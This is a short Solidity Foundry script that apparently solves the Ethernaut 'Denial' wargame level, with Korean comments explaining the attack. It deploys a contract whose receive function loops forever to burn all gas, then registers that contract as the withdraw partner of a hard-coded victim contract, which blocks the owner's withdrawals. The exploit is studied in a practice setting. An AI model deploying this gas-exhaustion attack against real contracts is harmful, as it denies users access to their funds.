// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/Denial.sol";
import "../lib/forge-std/src/Script.sol";

contract AttackDenial {
    receive() external payable {
        // Denial 컨트랙트가 partner.call{value: amountToSend}("")로 Ether를 보낼 때 이 함수가 자동으로 실행됨
        // 무한 루프로 가스 소진시키기 -> 가스가 바닥나면 revert
        while(true) {

        }
    }
}

contract DenialSolution is Script {
    Denial victimInstance = Denial(payable(0x7f41E349845a58B175824693dCfA14973cFF48dE));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackDenial attacker = new AttackDenial();
        victimInstance.setWithdrawPartner(address(attacker));
        vm.stopBroadcast();
    }
}